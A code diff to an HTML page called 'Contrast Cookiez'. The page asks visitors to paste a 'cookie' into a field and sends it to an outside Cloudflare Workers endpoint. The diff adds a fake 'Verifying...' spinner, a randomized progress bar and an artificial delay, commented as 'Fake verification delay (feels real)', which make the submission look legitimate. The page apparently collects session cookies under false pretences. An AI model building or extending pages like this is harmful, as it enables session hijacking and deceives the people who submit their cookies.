@@ -5,6 +5,68 @@
 <title>Contrast Cookiez</title>
 
 <style>
+  .progress-bar {
+  width: 100%;
+  height: 6px;
+  background: #ddd;
+  border-radius: 4px;
+  margin-top: 14px;
+  overflow: hidden;
+  opacity: 0;
+}
+
+.progress-fill {
+  width: 0%;
+  height: 100%;
+  background: linear-gradient(135deg, #6a11cb, #2575fc);
+  transition: width 0.4s ease;
+}
+
+.verifying + .progress-bar {
+  opacity: 1;
+}
+
+  .spinner {
+  width: 22px;
+  height: 22px;
+  border: 3px solid rgba(255,255,255,0.3);
+  border-top-color: #fff;
+  border-radius: 50%;
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  opacity: 0;
+}
+
+.verifying .spinner {
+  opacity: 1;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: translate(-50%, -50%) rotate(360deg); }
+}
+
+.verifying .btn-text {
+  opacity: 0;
+}
+
+  .verifying {
+  background: linear-gradient(135deg, #444, #222) !important;
+  cursor: wait;
+}
+
+.verifying .btn-text {
+  animation: dots 1.4s infinite;
+}
+
+@keyframes dots {
+  0%   { content: "Verifying."; }
+  33%  { content: "Verifying.."; }
+  66%  { content: "Verifying..."; }
+}
+
 * { box-sizing: border-box; }
 
 body {
@@ -110,6 +172,7 @@ button {
   position: relative;
   overflow: hidden;
   transition: 0.35s;
+  margin-top: 16px;
 }
 
 button:hover {
@@ -272,12 +335,16 @@ button.success .btn-text { opacity: 0; }
   <input id="response" type="text" placeholder="Cookie here">
 
   <button id="submitBtn">
+    <div class="progress-bar">
+  <div class="progress-fill"></div>
+</div>
     <div class="circle">
       <svg viewBox="0 0 52 52">
         <path d="M14 27 L22 35 L38 19"></path>
       </svg>
     </div>
-    <span class="btn-text">Submit</span>
+    <div class="spinner"></div>
+    <span class="btn-text" id="btnText">Submit</span>
   </button>
 
   <p id="thankyou">Thank you, please have some patience.</p>
@@ -285,7 +352,7 @@ button.success .btn-text { opacity: 0; }
 </div>
 
 <audio id="clickSound" preload="auto">
-  <source src="https://cdn.jsdelivr.net/gh/itsron717/assets/click.mp3">
+  <source src="https://bigsoundbank.com/UPLOAD/mp3/1735.mp3">
 </audio>
 
 <script>
@@ -309,24 +376,59 @@ document.getElementById("backBtn").onclick = () => {
 
 document.getElementById("submitBtn").onclick = async () => {
   const input = response;
-  const btn = submitBtn;
+const btn = submitBtn;
+const btnText = document.getElementById("btnText");
 
-  if (!input.value.trim() || btn.disabled) return;
+if (!input.value.trim() || btn.disabled) return;
 
-  play();
+play();
 
-  await fetch("https://server-proxygals.gonzalesartandrei913.workers.dev/", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ response: input.value })
-  });
+// --- Verifying state ---
+btn.disabled = true;
+  const fill = document.querySelector(".progress-fill");
+fill.style.width = "0%";
 
-  btn.classList.add("success");
-  btn.disabled = true;
-  input.disabled = true;
-  thankyou.style.display = "block";
+let progress = 0;
+const progressTimer = setInterval(() => {
+  progress += Math.random() * 18;
+  fill.style.width = Math.min(progress, 90) + "%";
+}, 300);
+btn.classList.add("verifying");
+  
+btnText.textContent = "Verifying";
+
+let dots = 0;
+const dotInterval = setInterval(() => {
+  dots = (dots + 1) % 4;
+  btnText.textContent = "Verifying" + ".".repeat(dots);
+}, 400);
+
+// Fake verification delay (feels real)
+await new Promise(r => setTimeout(r, 1600));
+
+// Send to worker
+await fetch("https://server-proxygals.gonzalesartandrei913.workers.dev/", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ response: input.value })
+});
+
+clearInterval(dotInterval);
+
+// --- Success ---
+// Finish progress bar
+clearInterval(progressTimer);
+fill.style.width = "100%";
+
+// Success animation
+btn.classList.remove("verifying");
+btn.classList.add("success");
+input.disabled = true;
+thankyou.style.display = "block";
+
 };
 </script>
 
 </body>
 </html>
+
